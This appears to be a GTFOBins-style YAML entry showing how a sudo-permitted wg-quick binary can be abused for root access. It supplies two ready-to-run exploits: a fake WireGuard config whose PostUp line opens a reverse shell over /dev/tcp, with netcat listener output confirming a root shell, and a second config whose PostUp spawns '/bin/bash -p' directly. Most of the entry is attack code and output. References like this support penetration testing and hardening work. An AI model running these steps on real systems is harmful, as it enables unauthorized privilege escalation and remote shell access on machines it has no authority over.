---
description: If the `wg-quick` binary is allowed via `sudo`, it can be abused to create a fake configuration which allows executing commands with root privileges.

This example creates a fake config parsed and loaded by `wg-quick`, allowing for obtaining a full reserve shell with root privileges. Note that here, `netcat` will be used, but of course, there are plenty of payloads you can replace to obtain the same.

functions:
  sudo:
    - description:
        If the `sudo -l` shows such a binary in the output

        ```
        (ALL) PASSWD: /usr/bin/wg-quick,
        ```

        This feature can be abused.

      code:
        Exploit,

        ```
        cat << EOF > ./wg1.conf
        [Interface]
        ListenPort = 51821
        PrivateKey = yNwWXHO7oIDQo/b5eS5R0xdVidxm50AwuQoIKTOGy1g=

        PostUp = sh -i >& /dev/tcp/127.0.0.1/1234 0>&1

        EOF
        ```

        `sudo wg-quick up ./wg1.conf`

        Will send a reverse shell on `127.0.0.1:1234` with root privileges

        ```
        nc -lvnp 1234
        listening on [any] 1234 ...
        connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55456
        # whoami
        root
        ```

        Another more direct way to obain a shell is to avoid the usage of netcat at all

        ```
        cat << EOF > ./wg1.conf
        [Interface]
        ListenPort = 51821
        PrivateKey = yNwWXHO7oIDQo/b5eS5R0xdVidxm50AwuQoIKTOGy1g=

        PostUp = /bin/bash -p

        EOF
        ```

        `sudo wg-quick up ./wg1.conf`

        This will directly drop to a `root` shell.

        ```
        #whoami
        root
        ``
---